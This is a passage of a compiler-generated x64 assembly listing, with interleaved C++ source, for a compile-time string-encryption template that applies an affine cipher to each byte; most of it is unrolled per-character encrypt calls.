  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
